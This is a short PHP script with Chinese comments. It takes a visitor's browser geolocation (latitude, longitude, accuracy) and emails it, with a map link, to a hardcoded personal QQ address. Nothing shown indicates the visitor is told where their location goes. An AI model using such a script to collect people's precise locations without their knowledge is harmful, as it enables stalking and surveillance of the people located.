<?php
// 获取前端发送的 JSON 数据
$data = json_decode(file_get_contents("php://input"), true);
$lat = $data['latitude'];
$lon = $data['longitude'];
$acc = $data['accuracy'];

// 构造邮件内容
$to = "1361640418@qq.com";  // 收件人邮箱
$subject = "用户位置信息";
$message = "用户当前位置：\n纬度：$lat\n经度：$lon\n精度：$acc 米\n地图链接：https://www.google.com/maps?q=$lat,$lon";
$headers = "From: no-reply@example.com";

// 发送邮件
if (mail($to, $subject, $message, $headers)) {
    echo "邮件已发送";
} else {
    echo "邮件发送失败";
}
?>
